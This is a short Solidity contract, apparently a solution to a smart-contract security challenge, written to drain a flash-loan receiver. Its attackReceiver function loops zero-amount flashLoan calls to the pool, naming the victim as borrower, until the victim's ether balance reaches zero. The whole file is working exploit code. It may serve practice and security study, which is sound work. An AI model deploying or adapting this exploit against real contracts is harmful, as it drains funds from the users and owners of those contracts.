pragma solidity ^0.6.0;

import "OpenZeppelin/openzeppelin-contracts@3.0.0/contracts/math/SafeMath.sol";
import "OpenZeppelin/openzeppelin-contracts@3.0.0/contracts/utils/Address.sol";

contract AttackFlashLoanReceiver {

    using SafeMath for uint256;
    using Address for address;

    address payable private pool;

    constructor(address payable poolAddress) public {
        pool = poolAddress;
    }

    function attackReceiver(address payable target) external {
        while (target.balance > 0) {
            (bool success, ) = pool.call(
            abi.encodeWithSignature(
                "flashLoan(address,uint256)",
                target,
                0
                )
            );
            require(success, "external call failed");
        }
    }
}